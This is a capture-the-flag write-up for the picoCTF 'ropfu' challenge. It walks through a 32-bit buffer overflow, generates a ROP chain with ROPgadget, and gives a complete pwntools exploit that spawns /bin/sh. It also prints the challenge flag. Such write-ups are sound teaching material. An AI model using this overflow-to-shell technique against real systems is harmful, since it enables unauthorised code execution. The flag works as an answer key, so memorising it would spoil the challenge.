# ropfu
> Write-up author: vreshco
## DESCRIPTION:
What's ROP? Can you exploit the following program to get the flag? Download source. nc saturn.picoctf.net 59565
## HINT:
- NONE
## STEPS:
1. First, download the binary file given, then check the binary type and it's protections.

> TYPE - 32 bit, not stripped.

![image](https://user-images.githubusercontent.com/70703371/217817473-ecb19db2-e5c6-41a2-baad-1d5f05520313.png)

> VULN - Partial RELRO (can read & write GOT), NX Disabled (can perform bufferoverflow with code execution from memory that marked as NX), NO PIE (ASLR disabled), Has RWX segments (allows us to inject shellcode & execute it). 

![image](https://user-images.githubusercontent.com/70703371/217817687-bcf2af08-a1d4-4a54-a41c-b82b226ab3cb.png)


2. Next, let's see the source code given.
3. Notice, at the `vuln()` function, we can do bufferoverflow.

![image](https://user-images.githubusercontent.com/70703371/217821110-61ff4078-48c4-4c2c-90e1-ceef8d3a5d72.png)


4. But the problem is, there's no flag function or any interesting function to jump.
5. Anyway let's find the correct offset first for EIP.
6. Let's run the binary using **pwndbg**, then enter cyclic 100 bytes as input.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/217822357-d7263cbe-6784-4361-b4fa-b68b8123c0bf.png)


![image](https://user-images.githubusercontent.com/70703371/217822396-c1009e7e-5033-4585-a004-afd2ccae8870.png)


7. Got segmentation fault, to find the offset, let's copy the 4 characters from the EIP.

> RESULT - 28

![image](https://user-images.githubusercontent.com/70703371/217822580-59b36ecb-b6e5-418d-9fd9-76765e26e4cc.png)


8. Since the binary has no interesting function to jump or execute and the binary protection seems tell us to make a **ropchain** script, hence we can use **ROPgadget** features to automate that.
9. Simply run `ROPgadget --binary ./vuln --ropchain --badbytes "00|0a"`.
10. With the `--badbytes` flag, we remove null bytes & new lines.
11. Because those shall messed up our **ropchain**.

> RESULT

```py
#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = b''

p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
        p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b074a) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5064) # @ .data + 4
        p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b074a) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
        p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0804fb90) # xor eax, eax ; ret
p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08049022) # pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
p += pack('<I', 0x08049e39) # pop ecx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
        p += pack('<I', 0x080e5060) # padding without overwrite ebx
p += pack('<I', 0x0804fb90) # xor eax, eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0804a3d2) # int 0x80
```

12. Let's combine the script with **pwntools**.

> THE SCRIPT

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: 
        return process([exe] + argv, *a, **kw)

exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

sh = start()

offset = b'A' * 28
ropPayloads = offset
ropPayloads += flat(0x080583c9) # pop edx ; pop ebx ; ret
ropPayloads += flat(0x080e5060) # @ .data
ropPayloads += flat(0x41414141) # padding
ropPayloads += flat(0x080b074a) # pop eax ; ret
ropPayloads += b'/bin'
ropPayloads += flat(0x08059102) # mov dword ptr [edx], eax ; ret
ropPayloads += flat(0x080583c9) # pop edx ; pop ebx ; ret
ropPayloads += flat(0x080e5064) # @ .data + 4
ropPayloads += flat(0x41414141) # padding
ropPayloads += flat(0x080b074a) # pop eax ; ret
ropPayloads += b'//sh'
ropPayloads += flat(0x08059102) # mov dword ptr [edx], eax ; ret
ropPayloads += flat(0x080583c9) # pop edx ; pop ebx ; ret
ropPayloads += flat(0x080e5068) # @ .data + 8
ropPayloads += flat(0x41414141) # padding
ropPayloads += flat(0x0804fb90) # xor eax, eax ; ret
ropPayloads += flat(0x08059102) # mov dword ptr [edx], eax ; ret
ropPayloads += flat(0x08049022) # pop ebx ; ret
ropPayloads += flat(0x080e5060) # @ .data
ropPayloads += flat(0x08049e39) # pop ecx ; ret
ropPayloads += flat(0x080e5068) # @ .data + 8
ropPayloads += flat(0x080583c9) # pop edx ; pop ebx ; ret
ropPayloads += flat(0x080e5068) # @ .data + 8
ropPayloads += flat(0x080e5060) # padding without overwrite ebx
ropPayloads += flat(0x0804fb90) # xor eax, eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0804a3d2) # int 0x80

p = flat([
    ropPayloads
])

sh.sendline(p)
sh.interactive()
```

13. Let's test it locally.

> RESULT - Got the shell!

![image](https://user-images.githubusercontent.com/70703371/217830995-177aac2b-332f-4b52-a159-8ba7fcb6dde5.png)


14. Great now let's run it remotely.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/217831186-b96b9cdb-f7f0-4a93-8bf8-a780e894df22.png)


15. Got the flag!

## FLAG

```
picoCTF{5n47ch_7h3_5h311_c6992ff0}
```